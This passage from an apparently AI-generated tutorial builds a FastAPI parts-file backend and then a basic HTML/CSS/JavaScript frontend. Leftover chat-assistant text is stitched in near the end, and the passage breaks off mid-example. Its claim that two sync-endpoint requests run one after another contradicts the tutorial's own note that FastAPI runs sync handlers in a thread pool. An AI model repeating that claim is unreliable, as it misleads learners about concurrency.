    { "name": "PN1003_OP1.mcam", "status": "available" }
  ]
}
```

**What's Happening:**

1. You returned a Python dictionary with a list of dictionaries
2. FastAPI called `json.dumps()` automatically
3. Set the `Content-Type: application/json` header automatically
4. Sent it back to the client

You never touched JSON manually. This is FastAPI's magic.

---

## 1.7: Path Parameters - Dynamic URLs

What if you want to get info about a specific file?

### Add This Endpoint

```python
@app.get("/api/files/{filename}")
def get_file(filename: str):
    # The {filename} in the path is captured here
    return {
        "filename": filename,
        "status": "available",
        "size": "1.2 MB",
        "last_modified": "2025-10-01"
    }
```

### Test It

```bash
curl http://127.0.0.1:8000/api/files/PN1001_OP1.mcam
```

**Output:**

```json
{
  "filename": "PN1001_OP1.mcam",
  "status": "available",
  "size": "1.2 MB",
  "last_modified": "2025-10-01"
}
```

**Try different filenames:**

```bash
curl http://127.0.0.1:8000/api/files/TEST.mcam
curl http://127.0.0.1:8000/api/files/anything-works.txt
```

**What's Happening:**

- `{filename}` in the path is a **path parameter**
- FastAPI extracts it and passes it to your function
- The `: str` type hint tells FastAPI "this should be a string"

### Type Conversion

What if you want an integer parameter?

```python
@app.get("/api/parts/{part_number}")
def get_part(part_number: int):
    return {
        "part_number": part_number,
        "type": type(part_number).__name__
    }
```

**Test it:**

```bash
curl http://127.0.0.1:8000/api/parts/12345
```

**Output:**

```json
{ "part_number": 12345, "type": "int" }
```

Notice `part_number` is an integer, not a string!

**What if you pass a non-integer?**

```bash
curl http://127.0.0.1:8000/api/parts/not-a-number
```

**Output:**

```json
{
  "detail": [
    {
      "loc": ["path", "part_number"],
      "msg": "value is not a valid integer",
      "type": "type_error.integer"
    }
  ]
}
```

**FastAPI automatically validated and returned a helpful error!** This is Pydantic at work.

---

## 1.8: Query Parameters - Optional Filters

Path parameters are required. **Query parameters** are optional and come after `?`.

Example: `http://example.com/api/files?status=available&sort=name`

### Add a Search Endpoint

```python
@app.get("/api/search")
def search_files(
    query: str = "",
    status: str = "all",
    limit: int = 10
):
    return {
        "query": query,
        "status": status,
        "limit": limit,
        "results": f"Searching for '{query}' with status='{status}', showing {limit} results"
    }
```

**Understanding the Parameters:**

- `query: str = ""` - String, defaults to empty
- `status: str = "all"` - String, defaults to "all"
- `limit: int = 10` - Integer, defaults to 10

### Test It

**All defaults:**

```bash
curl "http://127.0.0.1:8000/api/search"
```

**With query parameter:**

```bash
curl "http://127.0.0.1:8000/api/search?query=PN1001"
```

**Multiple parameters:**

```bash
curl "http://127.0.0.1:8000/api/search?query=PN1001&status=available&limit=5"
```

**The `?` and `&` Syntax:**

- First parameter: `?query=value`
- Additional parameters: `&status=value&limit=value`

---

## 1.9: Async/Await - The Key to FastAPI's Speed

### The Problem: Blocking I/O

**Scenario:** Your endpoint needs to read a file from disk.

**Synchronous (Blocking) Code:**

```python
def get_file_sync(filename):
    # This BLOCKS - the entire program freezes
    with open(filename) as f:
        content = f.read()  # Takes 100ms
    return content
```

**What Happens:**

1. Request 1 arrives
2. Server starts reading file (100ms)
3. Request 2 arrives
4. Request 2 waits (can't start until Request 1 finishes)
5. Request 1 finishes, sends response
6. Request 2 starts processing

**Result:** Requests are handled one-at-a-time. Slow.

### The Solution: Async/Await

**Asynchronous (Non-Blocking) Code:**

```python
async def get_file_async(filename):
    # This does NOT block
    async with aiofiles.open(filename) as f:
        content = await f.read()  # Yields control during I/O
    return content
```

**What Happens:**

1. Request 1 arrives
2. Server starts reading file
3. **While waiting for disk**, Request 2 arrives
4. Request 2 starts processing immediately
5. Disk finishes for Request 1, sends response
6. Request 2 continues

**Result:** Server handles multiple requests concurrently. Fast.

### The Event Loop - How Async Works

**The Mental Model:**

Think of a restaurant with one chef (your CPU):

**Synchronous Kitchen:**

- Chef makes burger
- While burger cooks (5 min), chef stands there waiting
- Customer 2 waits in line
- Burger done, serve customer 1
- Now make customer 2's order

**Async Kitchen:**

- Chef makes burger, puts it on grill
- While burger cooks, chef starts customer 2's salad
- Burger done? Pause salad, serve burger
- Resume salad

**The async kitchen serves more customers faster** with the same number of chefs.

### Making Your Endpoints Async

**Synchronous endpoint (blocking):**

```python
@app.get("/slow")
def slow_endpoint():
    import time
    time.sleep(2)  # Simulates slow I/O
    return {"message": "Done"}
```

**Async endpoint (non-blocking):**

```python
@app.get("/fast")
async def fast_endpoint():
    import asyncio
    await asyncio.sleep(2)  # Simulates slow I/O
    return {"message": "Done"}
```

### The Rules

**When to use `async def`:**

- When your function uses `await`
- When you're doing I/O (database, files, HTTP requests)
- When you want FastAPI to handle the function asynchronously

**When to use regular `def`:**

- Simple, CPU-only operations
- No I/O operations
- You're not using `await` anywhere

**Key Point:** FastAPI can handle BOTH. It's smart about running sync functions in a thread pool so they don't block.

### Async Example - Simulating I/O

Add this to `main.py`:

```python
import asyncio

@app.get("/sync-slow")
def sync_slow():
    import time
    time.sleep(2)  # BLOCKS everything
    return {"message": "Sync done"}

@app.get("/async-fast")
async def async_fast():
    await asyncio.sleep(2)  # Does NOT block
    return {"message": "Async done"}
```

### Test Concurrency

**Terminal 1:**

```bash
time curl http://127.0.0.1:8000/sync-slow
```

**Terminal 2 (immediately after):**

```bash
time curl http://127.0.0.1:8000/sync-slow
```

**Result:** Second request waits ~4 seconds total (2 + 2).

**Now try async:**

**Terminal 1:**

```bash
time curl http://127.0.0.1:8000/async-fast
```

**Terminal 2 (immediately after):**

```bash
time curl http://127.0.0.1:8000/async-fast
```

**Result:** Both finish in ~2 seconds. They ran concurrently!

---

## 1.10: Request Body with POST

So far, we've only read data (GET). Let's accept data from the client (POST).

### Defining a Data Model

Create a new section in `main.py`:

```python
from pydantic import BaseModel

class FileCheckout(BaseModel):
    filename: str
    user: str
    message: str

@app.post("/api/checkout")
def checkout_file(checkout: FileCheckout):
    return {
        "success": True,
        "message": f"User '{checkout.user}' checked out '{checkout.filename}'",
        "details": checkout.message
    }
```

### Understanding Pydantic Models

**What is `FileCheckout`?**

- A **data model** - defines the shape of expected data
- Inherits from `BaseModel`
- Uses type hints to define fields
- **Automatically validates** incoming data

**What FastAPI Does:**

1. Receives JSON in request body
2. Validates it against `FileCheckout`
3. If valid, creates a `FileCheckout` object and passes it to your function
4. If invalid, returns 422 error with details

### Testing with curl

```bash
curl -X POST http://127.0.0.1:8000/api/checkout \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "PN1001_OP1.mcam",
    "user": "john_doe",
    "message": "Editing fixture plate"
  }'
```

**Response:**

```json
{
  "success": true,
  "message": "User 'john_doe' checked out 'PN1001_OP1.mcam'",
  "details": "Editing fixture plate"
}
```

### Testing Validation

**Missing a required field:**

```bash
curl -X POST http://127.0.0.1:8000/api/checkout \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "PN1001_OP1.mcam",
    "user": "john_doe"
  }'
```

**Response:**

```json
{
  "detail": [
    {
      "loc": ["body", "message"],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

Pydantic caught the missing field!

---

## 1.11: Error Handling

### Raising HTTP Exceptions

```python
from fastapi import HTTPException

@app.get("/api/files/{filename}")
def get_file_detail(filename: str):
    # Simulate checking if file exists
    valid_files = ["PN1001_OP1.mcam", "PN1002_OP1.mcam"]

    if filename not in valid_files:
        raise HTTPException(
            status_code=404,
            detail=f"File '{filename}' not found"
        )

    return {
        "filename": filename,
        "status": "available"
    }
```

**Test it:**

```bash
### Valid file
curl http://127.0.0.1:8000/api/files/PN1001_OP1.mcam

### Invalid file
curl http://127.0.0.1:8000/api/files/NOTREAL.mcam
```

**Second request returns:**

```json
{ "detail": "File 'NOTREAL.mcam' not found" }
```

With status code 404.

---

## 1.12: Logging - Seeing What's Happening

### Basic Python Logging

Add to the top of `main.py`:

```python
import logging

### Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
```

### Using the Logger

```python
@app.get("/api/files")
def get_files():
    logger.info("Fetching all files")

    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"}
    ]

    logger.info(f"Returning {len(files)} files")
    return {"files": files}
```

**Test it:**

```bash
curl http://127.0.0.1:8000/api/files
```

**Check your server terminal:**

```
2025-10-03 20:30:45 - main - INFO - Fetching all files
2025-10-03 20:30:45 - main - INFO - Returning 2 files
INFO:     127.0.0.1:54321 - "GET /api/files HTTP/1.1" 200 OK
```

You now have visibility into what your server is doing!

---

## 1.13: Automatic API Documentation

This is one of FastAPI's killer features.

### The Interactive Docs

**Visit in your browser:**

```
http://127.0.0.1:8000/docs
```

You'll see **Swagger UI** - an interactive API documentation page.

**What you can do:**

- See all your endpoints
- See required parameters
- **Try it out** - make requests directly from the browser
- See request/response examples

**Try it:**

1. Click on `GET /api/files`
2. Click "Try it out"
3. Click "Execute"
4. See the response right there

### Alternative Docs

**Visit:**

```
http://127.0.0.1:8000/redoc
```

This is **ReDoc** - a different documentation style, same data.

### How Does This Work?

**OpenAPI Specification:**

- FastAPI automatically generates an **OpenAPI schema** from your code
- The type hints (`filename: str`) become part of the schema
- Pydantic models become JSON Schema definitions
- The docs are generated from this schema

**View the raw schema:**

```
http://127.0.0.1:8000/openapi.json
```

This JSON describes your entire API. Other tools can consume it.

---

## 1.14: Testing with Pytest

### Install Testing Tools

```bash
pip install pytest httpx
```

**Why `httpx`?**

- FastAPI's test client uses it
- It's like `requests` but with async support

### Create Test File

Create `backend/test_main.py`:

```python
from fastapi.testclient import TestClient
from main import app

### Create a test client
client = TestClient(app)

def test_read_root():
    """Test the root endpoint"""
    response = client.get("/")
    assert response.status_code == 200
    assert response.json() == {"message": "Hello from the PDM Backend!"}

def test_get_files():
    """Test the files list endpoint"""
    response = client.get("/api/files")
    assert response.status_code == 200
    data = response.json()
    assert "files" in data
    assert len(data["files"]) > 0

def test_get_file_not_found():
    """Test 404 for non-existent file"""
    response = client.get("/api/files/NONEXISTENT.mcam")
    assert response.status_code == 404

def test_checkout_file():
    """Test checkout endpoint"""
    response = client.post(
        "/api/checkout",
        json={
            "filename": "PN1001_OP1.mcam",
            "user": "test_user",
            "message": "Testing checkout"
        }
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
```

### Run Tests

```bash
pytest test_main.py -v
```

**Output:**

```
test_main.py::test_read_root PASSED
test_main.py::test_get_files PASSED
test_main.py::test_get_file_not_found PASSED
test_main.py::test_checkout_file PASSED

====== 4 passed in 0.12s ======
```

### Understanding the Tests

**`TestClient(app)`**

- Creates a fake client
- Doesn't need a running server
- Makes real HTTP requests, but in-memory

**`assert` statements**

- If condition is `False`, test fails
- Tests are independent - they don't affect each other

**Test function names**

- Must start with `test_`
- Descriptive names explain what's being tested

---

## Stage 1 Complete - Your First API

### What You Built

You now have:

- A working FastAPI server with multiple endpoints
- GET endpoints with path and query parameters
- POST endpoint with data validation
- Error handling with proper HTTP status codes
- Logging for debugging
- Automated tests
- Auto-generated documentation

### Your Complete `main.py` (So Far)

```python
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import logging
import asyncio

### Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = FastAPI()

### Data model for checkout
class FileCheckout(BaseModel):
    filename: str
    user: str
    message: str

@app.get("/")
def read_root():
    return {"message": "Hello from the PDM Backend!"}

@app.get("/api/files")
def get_files():
    logger.info("Fetching all files")
    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"},
        {"name": "PN1003_OP1.mcam", "status": "available"}
    ]
    logger.info(f"Returning {len(files)} files")
    return {"files": files}

@app.get("/api/files/{filename}")
def get_file_detail(filename: str):
    valid_files = ["PN1001_OP1.mcam", "PN1002_OP1.mcam", "PN1003_OP1.mcam"]

    if filename not in valid_files:
        raise HTTPException(
            status_code=404,
            detail=f"File '{filename}' not found"
        )

    return {
        "filename": filename,
        "status": "available",
        "size": "1.2 MB"
    }

@app.post("/api/checkout")
def checkout_file(checkout: FileCheckout):
    logger.info(f"Checkout: {checkout.user} -> {checkout.filename}")
    return {
        "success": True,
        "message": f"User '{checkout.user}' checked out '{checkout.filename}'",
        "details": checkout.message
    }

@app.get("/async-demo")
async def async_demo():
    logger.info("Starting async operation")
    await asyncio.sleep(1)
    logger.info("Async operation complete")
    return {"message": "Async done"}
```

### Verification Checklist

- [ ] FastAPI installed (`pip list | grep fastapi`)
- [ ] Server runs without errors (`uvicorn main:app --reload`)
- [ ] Can access root endpoint in browser
- [ ] Can view auto docs at `/docs`
- [ ] POST endpoint accepts JSON data
- [ ] Tests pass (`pytest test_main.py`)
- [ ] Understand async vs sync
- [ ] Know the difference between path and query parameters

#

In **Stage 2**, we'll add a frontend. You'll learn:

- HTML structure and semantic tags
- CSS for styling
- JavaScript for interactivity
- How to serve static files from FastAPI
- Making fetch requests from JavaScript to your API

The pieces are coming together. You now have a working backend that can accept and return data. Next, we build the user interface.

---

**Copy this into MkDocs. When ready, request Stage 2.**

### Stage 2: First Frontend - HTML, CSS, and JavaScript Basics

## Introduction: The Goal of This Stage

Your backend can serve JSON, but JSON isn't a user interface. In this stage, you'll build the visual layer - the part users actually see and interact with.

By the end of this stage, you will:

- Serve static HTML/CSS/JS files from FastAPI
- Understand HTML document structure and semantic tags
- Apply CSS styling (box model, colors, basic layout)
- Manipulate the DOM with JavaScript
- Make your first fetch request from frontend to backend
- Display API data in the browser
- Handle user interactions with event listeners

**Time Investment:** 4-6 hours

---

## 2.1: The Frontend-Backend Relationship

### The Architecture

```
┌─────────────────┐         ┌──────────────────┐
│   Browser       │ ←──────→│   FastAPI        │
│   (Frontend)    │  HTTP   │   (Backend)      │
│                 │         │                  │
│  HTML           │         │  Python Code     │
│  CSS            │         │  Business Logic  │
│  JavaScript     │         │  Database Access │
└─────────────────┘         └──────────────────┘
```

**The Division of Labor:**

| Frontend          | Backend               |
| ----------------- | --------------------- |
| What user sees    | What user doesn't see |
| Presentation      | Business logic        |
| User interactions | Data processing       |
| HTML/CSS/JS       | Python/FastAPI        |
| Runs in browser   | Runs on server        |

**The Communication:** They talk via HTTP/JSON (which we built in Stage 1).

---

## 2.2: Serving Static Files from FastAPI

### Create the Frontend Folder

```bash
### In your pdm-tutorial directory
mkdir -p backend/static/css
mkdir -p backend/static/js
```

**Your structure should look like:**

```
pdm-tutorial/
├── backend/
│   ├── main.py
│   ├── test_main.py
│   └── static/
│       ├── index.html
│       ├── css/
│       │   └── style.css
│       └── js/
│           └── app.js
└── venv/
```

### Configure FastAPI to Serve Static Files

Update `backend/main.py`:

```python
from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pydantic import BaseModel
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

### Mount static files directory
app.mount("/static", StaticFiles(directory="static"), name="static")

### Serve the main HTML file at the root
@app.get("/")
def serve_frontend():
    return FileResponse("static/index.html")

### Keep your existing API endpoints
@app.get("/api/files")
def get_files():
    logger.info("Fetching all files")
    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"},
        {"name": "PN1003_OP1.mcam", "status": "available"}
    ]
    return {"files": files}

class FileCheckout(BaseModel):
    filename: str
    user: str
    message: str

@app.post("/api/checkout")
def checkout_file(checkout: FileCheckout):
    logger.info(f"Checkout: {checkout.user} -> {checkout.filename}")
    return {
        "success": True,
        "message": f"User '{checkout.user}' checked out '{checkout.filename}'"
    }
```

### Understanding Static File Serving

**`app.mount("/static", StaticFiles(directory="static"), name="static")`**

- **`/static`** - URL prefix (all static files accessed via `/static/...`)
- **`StaticFiles(directory="static")`** - Serves files from the `static` folder
- **`name="static"`** - Internal name for the mount

**How it works:**

1. User requests `http://localhost:8000/static/css/style.css`
2. FastAPI looks in `backend/static/css/style.css`
3. If found, sends the file with correct MIME type
4. If not found, returns 404

**`FileResponse("static/index.html")`**

- Sends a single file as the response
- Browser receives it and renders HTML

---

## 2.3: HTML - The Structure Layer

### Create Your First HTML File

Create `backend/static/index.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PDM - Parts Data Management</title>
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body>
    <header>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </header>

    <main>
      <section id="file-list-section">
        <h2>Available Files</h2>
        <div id="file-list">
          <!-- Files will be loaded here by JavaScript -->
          <p>Loading files...</p>
        </div>
      </section>
    </main>

    <footer>
      <p>&copy; 2025 PDM Tutorial</p>
    </footer>

    <script src="/static/js/app.js"></script>
  </body>
</html>
```

### Understanding Every Line

**`<!DOCTYPE html>`**

- Tells browser "this is HTML5"
- Must be first line
- Not technically an HTML tag

**`<html lang="en">`**

- Root element - everything goes inside
- `lang="en"` tells screen readers and search engines the language

**`<head>` Section** - Metadata (not visible content)

**`<meta charset="UTF-8">`**

- Character encoding (supports all languages/symbols)
- UTF-8 can represent 1,112,064 different characters

**`<meta name="viewport" content="width=device-width, initial-scale=1.0">`**

- Makes site responsive on mobile
- `width=device-width` - match screen width
- `initial-scale=1.0` - no zoom on load

**`<title>`**

- Shows in browser tab
- Used by search engines
- Required in all HTML documents

**`<link rel="stylesheet" href="/static/css/style.css">`**

- Loads external CSS file
- `/static/css/style.css` is the path (remember the mount point?)

**`<body>` Section** - Visible content

**Semantic HTML Tags:**

| Tag         | Purpose           | Why Not Just `<div>`?                    |
| ----------- | ----------------- | ---------------------------------------- |
| `<header>`  | Page header       | Screen readers know it's navigation area |
| `<main>`    | Primary content   | SEO: search engines prioritize this      |
| `<section>` | Thematic grouping | Better structure than generic `<div>`    |
| `<footer>`  | Page footer       | Accessibility: skip navigation links     |

**`<script src="/static/js/app.js"></script>`**

- Loads JavaScript file
- Placed at END of `<body>` (we'll explain why shortly)

### Test It

**Restart your server:**

```bash
uvicorn main:app --reload
```

**Visit:**

```
http://127.0.0.1:8000
```

You should see a plain, unstyled page with "PDM System" and "Loading files..."

---

## 2.4: CSS - The Presentation Layer

### Create Your Stylesheet

Create `backend/static/css/style.css`:

```css
/* ============================================
   RESET & GLOBAL STYLES
   ============================================ */

/* Apply to every element on the page */
* {
  margin: 0; /* Remove all default margins (browsers add them by default, e.g., on <p> or <h1>) */
  padding: 0; /* Remove all default padding */
  box-sizing: border-box; /* Change box-sizing so width/height includes padding & border (easier sizing control) */
}

/* Base body styles applied to the whole document */
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, sans-serif; /* Use system UI fonts first, fallback to common web-safe fonts */
  line-height: 1.6; /* Increases readability by spacing lines slightly further apart */
  color: #333; /* Default text color: dark gray (less harsh than black) */
  background-color: #f5f5f5; /* Light gray background for the page */
}

/* ============================================
   HEADER
   ============================================ */

/* Styles for the top header bar */
header {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  /* Gradient background from bluish-purple to purple, angled diagonally */
  color: white;
  padding: 2rem; /* Add space inside header for breathing room */
  text-align: center; /* Center text (h1 and p) horizontally */
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
  /* Subtle drop shadow below header to lift it visually */
}

/* The main site title inside the header */
header h1 {
  font-size: 2.5rem; /* Large, prominent heading */
  margin-bottom: 0.5rem; /* Small gap between title and the subtitle paragraph */
}

/* Subtitle text under the header title */
header p {
  font-size: 1.1rem; /* Slightly larger than normal body text */
  opacity: 0.9; /* Slightly faded, less visual weight than the title */
}

/* ============================================
   MAIN CONTENT
   ============================================ */

/* The <main> wrapper for page content */
main {
  max-width: 1200px; /* Restrict content width for readability (no ultra-wide text lines) */
  margin: 2rem auto; /* Vertical spacing + center horizontally */
  padding: 0 1rem; /* Small side padding so text doesn’t touch the edges */
}

/* Any <section> in the page */
section {
  background: white; /* White card-like background */
  padding: 2rem; /* Spacing inside the section */
  border-radius: 8px; /* Rounded corners for a modern card look */
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); /* Soft shadow for separation from background */
  margin-bottom: 2rem; /* Space between stacked sections */
}

/* Section headings (like "Available Files") */
h2 {
  color: #667eea; /* Match theme color (bluish-purple) */
  margin-bottom: 1.5rem; /* Space below heading */
  font-size: 1.8rem; /* Larger than body, smaller than h1 */
}

/* ============================================
   FILE LIST
   ============================================ */

/* Container for list of files */
#file-list {
  display: flex; /* Use flexbox for layout */
  flex-direction: column; /* Stack items vertically */
  gap: 1rem; /* Even spacing between each file item */
}

/* Individual file items */
.file-item {
  padding: 1rem; /* Spacing inside each file box */
  border: 1px solid #e0e0e0; /* Light gray border around file item */
  border-radius: 4px; /* Slightly rounded corners */
  display: flex; /* Flexbox to arrange name + status horizontally */
  justify-content: space-between; /* Push file name left, status to the far right */
  align-items: center; /* Vertically align text inside the row */
  transition: all 0.3s ease; /* Smooth animation for hover effects */
}

/* Hover state for file items */
.file-item:hover {
  background-color: #f9f9f9; /* Light background highlight */
  border-color: #667eea; /* Border turns theme color */
  transform: translateX(5px); /* Nudge item to the right for interactivity */
}

/* File name text */
.file-name {
  font-weight: 600; /* Bold text for emphasis */
  color: #333; /* Dark gray, consistent with body text */
}

/* Status label (e.g., Available, Checked out) */
.file-status {
  padding: 0.25rem 0.75rem; /* Small pill-like padding around text */
  border-radius: 12px; /* Rounded capsule shape */
  font-size: 0.9rem; /* Slightly smaller than normal text */
  font-weight: 500; /* Medium boldness for visibility */
}

/* Available file status */
.status-available {
  background-color: #d4edda; /* Soft green background (success/available color) */
  color: #155724; /* Dark green text */
}

/* Checked-out file status */
.status-checked_out {
  background-color: #fff3cd; /* Yellow background (warning/attention color) */
  color: #856404; /* Dark yellow/brown text */
}

/* ============================================
   FOOTER
   ============================================ */

/* Footer section at the bottom */
footer {
  text-align: center; /* Center align footer text */
  padding: 2rem; /* Spacing inside footer */
  color: #666; /* Medium gray text color */
  font-size: 0.9rem; /* Slightly smaller than body text */
}
```

### Understanding CSS Concepts

### The CSS Box Model

Every HTML element is a box. Understanding this is fundamental.

```
┌─────────────────────────────────────┐
│          MARGIN (transparent)       │
│  ┌──────────────────────────────┐  │
│  │   BORDER                     │  │
│  │  ┌───────────────────────┐  │  │
│  │  │   PADDING             │  │  │
│  │  │  ┌────────────────┐  │  │  │
│  │  │  │    CONTENT     │  │  │  │
│  │  │  │                │  │  │  │
│  │  │  └────────────────┘  │  │  │
│  │  └───────────────────────┘  │  │
│  └──────────────────────────────┘  │
└─────────────────────────────────────┘
```

**`box-sizing: border-box;`**

- Changes how width is calculated
- **Without it:** width = content width (padding/border added on top)
- **With it:** width = total width (padding/border included)

**Example:**

```css
.box {
  width: 200px;
  padding: 20px;
  border: 5px solid black;
}
```

**Default (`content-box`):** Total width = 200 + 40 (padding) + 10 (border) = 250px  
**With `border-box`:** Total width = 200px (includes everything)

**Why `* { box-sizing: border-box; }`?**

- Applies to ALL elements (`*` = universal selector)
- Makes layout math easier
- Industry standard practice

### CSS Selectors

```css
/* Element selector - all <header> tags */
header {
  background: blue;
}

/* ID selector - element with id="file-list" */
#file-list {
  display: flex;
}

/* Class selector - elements with class="file-item" */
.file-item {
  padding: 1rem;
}

/* Descendant selector - <p> inside <header> */
header p {
  color: white;
}

/* Pseudo-class - hover state */
.file-item:hover {
  background: gray;
}
```

**Specificity (which rule wins?):**

1. Inline styles (highest priority)
2. IDs (`#file-list`)
3. Classes (`.file-item`)
4. Elements (`header`)

### Colors in CSS

```css
/* Named colors */
color: red;

/* Hex codes (most common) */
color: #667eea; /* Purple */
/* Breakdown: #RR GG BB in hexadecimal */

/* RGB */
color: rgb(102, 126, 234);

/* RGBA (with transparency) */
background: rgba(0, 0, 0, 0.1); /* 10% opaque black */
```

### The `rem` Unit

```css
padding: 2rem;
```

**What is `rem`?**

- "Root em" - relative to root font size
- Root font size = browser default (usually 16px)
- `2rem` = 2 × 16px = 32px

**Why use `rem` instead of `px`?**

- Users can change browser font size (accessibility)
- Your layout scales automatically
- `1rem` at base size, `2rem` for double, etc.

**Other units:**

- `px` - Fixed pixels
- `%` - Percentage of parent
- `em` - Relative to parent font size (confusing with nesting)
- `vh/vw` - Viewport height/width (1vh = 1% of screen height)

### Refresh and See Styling

**Visit:** `http://127.0.0.1:8000`

Your page now has:

- Purple gradient header
- White content cards
- Styled layout
- Professional appearance

But still says "Loading files..." - we'll fix that with JavaScript.

---

## 2.5: JavaScript - The Behavior Layer

### The Document Object Model (DOM)

When the browser loads HTML, it creates a **tree structure** in memory called the DOM.

**Your HTML:**

```html
<body>
  <header>
    <h1>PDM System</h1>
  </header>
  <main>
    <div id="file-list"></div>
  </main>
</body>
```

**The DOM Tree:**

```
document
└── html
    └── body
        ├── header
        │   └── h1
        │       └── "PDM System" (text node)
        └── main
            └── div#file-list
```

**JavaScript can:**

- Navigate this tree
- Find elements
- Change content
- Add/remove elements
- Respond to user actions

### Create Your JavaScript File

Create `backend/static/js/app.js`:

```javascript
// ============================================
// WAIT FOR DOM TO LOAD
// ============================================

document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");
  loadFiles();
});

// ============================================
// LOAD FILES FROM API
// ============================================

async function loadFiles() {
  console.log("Loading files from API...");

  try {
    // Make GET request to our API
    const response = await fetch("/api/files");

    // Check if request succeeded
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    // Parse JSON response
    const data = await response.json();
    console.log("Received data:", data);

    // Display files
    displayFiles(data.files);
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  }
}

// ============================================
// DISPLAY FILES IN THE DOM
// ============================================

function displayFiles(files) {
  // Find the container element
  const container = document.getElementById("file-list");

  // Clear loading message
  container.innerHTML = "";

  // Check if we have files
  if (!files || files.length === 0) {
    container.innerHTML = "<p>No files found.</p>";
    return;
  }

  // Create HTML for each file
  files.forEach((file) => {
    const fileElement = createFileElement(file);
    container.appendChild(fileElement);
  });

  console.log(`Displayed ${files.length} files`);
}

// ============================================
// CREATE A SINGLE FILE ELEMENT
// ============================================

function createFileElement(file) {
  // Create the container div
  const div = document.createElement("div");
  div.className = "file-item";

  // Create file name span
  const nameSpan = document.createElement("span");
  nameSpan.className = "file-name";
  nameSpan.textContent = file.name;

  // Create status span
  const statusSpan = document.createElement("span");
  statusSpan.className = `file-status status-${file.status}`;
  statusSpan.textContent = file.status.replace("_", " ");

  // Assemble the pieces
  div.appendChild(nameSpan);
  div.appendChild(statusSpan);

  return div;
}

// ============================================
// DISPLAY ERROR MESSAGE
// ============================================

function displayError(message) {
  const container = document.getElementById("file-list");
  container.innerHTML = `
        <div style="color: red; padding: 1rem; background: #fee; border-radius: 4px;">
            ${message}
        </div>
    `;
}
```

### Understanding JavaScript Concepts

### `DOMContentLoaded` Event

**Why wait for this event?**

```javascript
document.addEventListener("DOMContentLoaded", function () {
  loadFiles();
});
```

**The Problem:**

1. Browser starts loading HTML
2. Browser encounters `<script>` tag
3. **If script runs immediately**, DOM might not be fully built yet
4. `document.getElementById('file-list')` returns `null`
5. Your code crashes

**The Solution:**

- Wait for `DOMContentLoaded` event
- Browser fires this when DOM is fully parsed
- Now it's safe to manipulate elements

**Alternative:** Put `<script>` at END of `<body>` (which we did)

- By the time script loads, DOM is already built
- Either approach works; using the event is more explicit

### Async/Await in JavaScript

```javascript
async function loadFiles() {
  const response = await fetch("/api/files");
  const data = await response.json();
}
```

**Comparison to Python:**

| Python                   | JavaScript                     |
| ------------------------ | ------------------------------ |
| `async def loadFiles():` | `async function loadFiles() {` |
| `await fetch(...)`       | `await fetch(...)` (same!)     |
| Returns a coroutine      | Returns a Promise              |

**What's a Promise?**

- A Promise represents a future value
- It's in one of three states:
  - **Pending** - Operation not finished yet
  - **Fulfilled** - Operation succeeded, value available
  - **Rejected** - Operation failed, error available

**`await` unwraps the Promise:**

```javascript
// Without await (returns Promise)
const promise = fetch("/api/files");
console.log(promise); // Promise { <pending> }

// With await (waits for Promise to resolve, returns value)
const response = await fetch("/api/files");
console.log(response); // Response object
```

### The Fetch API

```javascript
const response = await fetch("/api/files");
```

**What `fetch()` does:**

1. Makes an HTTP request (default: GET)
2. Returns a Promise that resolves to a Response object
3. The Response contains the raw HTTP response

**The Response object:**

```javascript
response.status; // 200
response.statusText; // "OK"
response.headers; // Headers object
response.ok; // true if status 200-299
```

**Getting the body:**

```javascript
const data = await response.json(); // Parse as JSON
// or
const text = await response.text(); // Get as plain text
// or
const blob = await response.blob(); // Get as binary
```

**Why two `await` calls?**

```javascript
const response = await fetch("/api/files"); // Wait for HTTP response
const data = await response.json(); // Wait for body parsing
```

The response headers arrive first; the body might still be streaming.

Nice — you asked for a full, deep, practical tutorial. I’ll explain the _exact_ `async/await` example you gave, the history that led us here, the runtime mechanics (event loop / microtasks), comparisons to older styles (XHR / callbacks / `.then`), a Python `httpx` mapping, advanced patterns (timeouts, retries, concurrency limits, cancellation), and a set of playground exercises with solutions you can paste into your tutorial.

I'll start with a corrected, annotated version of your function (fixed typos and added defensive behavior), then dive into details.

### Corrected, annotated example

```javascript
// loadFiles.js
async function loadFiles() {
  console.log("Loading files from API...");

  try {
    // Make GET request to our API (relative URL; in production use full origin)
    const response = await fetch("/api/files");

    // fetch() only rejects for network/CORS failures — not for HTTP errors
    if (!response.ok) {
      // response.status is numeric (e.g., 404)
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    // response.json() returns a Promise that resolves to the parsed JSON object
    const data = await response.json();
    console.log("Received data:", data);

    // assume data.files is an array
    displayFiles(data.files);
  } catch (error) {
    // catches thrown Errors or rejected promises from above
